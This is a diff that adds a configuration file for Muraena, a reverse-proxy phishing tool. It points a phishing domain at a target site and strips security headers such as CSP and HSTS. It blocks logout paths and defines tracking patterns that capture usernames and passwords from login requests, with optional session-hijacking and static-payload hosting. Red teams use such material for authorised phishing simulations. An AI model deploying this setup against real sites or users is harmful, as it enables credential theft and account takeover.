@@ -1,0 +1,197 @@
+[proxy]
+    # Phishing domain
+    phishing = "phishing.click"
+
+    # Target domain to proxy
+    destination = "victim.site"
+
+    # Listening IP address
+    IP = "0.0.0.0"
+
+    # Listeninng TCP Port
+    port = 443
+
+    #
+    # Simple port forwarding used when the phishing site listen on a port different from target domain, such as:
+    # - test.muraena:8443
+    # - victim.site: 443
+    #
+    # port mapping can be configured as follow: ListeningPort:TargetPort
+    # portmapping = "443:31337"
+
+
+    # Force HTTP to HTTPS redirection
+    [proxy.HTTPtoHTTPS]
+    enabled = true
+    HTTPport = 80
+
+
+#
+# Proxy's replacement rules
+#
+[transform]
+
+    # List of content types to exclude from the transformation process
+    skipContentType = [ "font/*", "image/*" ]
+
+    # Enable transformation rules in base64 strings
+    [transform.base64]
+    enabled = false
+    padding = [ "=", "." ]
+
+    [transform.request]
+        headers = [
+            "Cookie",
+            "Referer",
+            "Origin",
+            "X-Forwarded-For"
+        ]
+
+    [transform.response]
+        headers = [
+            "Location",
+            "WWW-Authenticate",
+            "Origin",
+            "Set-Cookie",
+            "Access-Control-Allow-Origin"
+        ]
+
+        # Generic replacement rules:
+        # it applies to body and any http header enabled for manipulation
+        content = [
+          [ "this is blue", "this is green" ]
+        ]
+
+
+#
+# Proxy's wiping rules
+#
+[remove]
+
+    [remove.request]
+        headers = [
+            "X-Forwarded-For"
+        ]
+
+    [remove.response]
+        headers = [
+            "Content-Security-Policy",
+            "Content-Security-Policy-Report-Only",
+            "Strict-Transport-Security",
+            "X-XSS-Protection",
+            "X-Content-Type-Options",
+            "X-Frame-Options",
+            "Referrer-Policy",
+            "X-Forwarded-For"
+        ]
+
+#
+# Rudimental redirection rules
+#
+[[drop]]
+    path = "/logout"
+    redirectTo = "https://victim.site"
+
+[[drop]]
+    path = "/singout"
+    redirectTo = "https://victim.site"
+
+
+#
+# LOG
+#
+[log]
+    enabled = true
+    filePath = "muraena.log"
+
+
+#
+# TLS
+#
+[tls]
+    enabled = true
+
+    # Expand allows to replace the content of the certificate/key/root parameters to their content instead of the
+    # filepath
+    expand = false
+    certificate = "./config/cert.pem"
+    key = "./config/privkey.pem"
+    root = "./config/fullchain.pem"
+
+#
+# CRAWLER
+#
+[crawler]
+    enabled = false
+    depth = 3
+    upto = 20
+    externalOriginPrefix = "www-"
+    externalOrigins = [
+      "*.anotherdomain.site",
+      "example.dev"
+    ]
+
+#
+# NECROBROWSER
+#
+[necrobrowser]
+    enabled = false
+    endpoint = "http://necrobrowser.url/xyz"
+    profile = "./config/instrument.necro"
+
+
+#
+# STATIC SERVER
+#
+[staticServer]
+    enabled = false
+    port = 8080
+    localPath = "./static/"
+    urlPath = "/evilpath/"
+
+
+#
+# TRACKING
+#
+[tracking]
+enabled = true
+
+    # Tracking types can be Path || Query (default)
+    #
+    # query:
+    #  ?identifier=trackingID
+    #
+    # path:
+    #   /trackingID
+    #
+    type = "query"
+
+    # Tracking identifier
+    identifier = "_gat"
+
+    # Rule to generate and validate a tracking identifier
+    regex = "[a-zA-Z0-9]{5}"
+
+    # Set speific victim's IP address
+    # ipSource = ""
+
+    # Set tracking cookie for a custom domain
+    # domain = ""
+
+    [tracking.urls]
+    credentials = [ "/session" ]
+    authSession = [ "/settings/profile" ]
+
+    [[tracking.patterns]]
+    label = "Username"
+    matching = "login"
+    start = "login="
+    end = "&password="
+
+    [[tracking.patterns]]
+    label = "Password"
+    matching = "password"
+    start = "password="
+    end = "&"
+
+
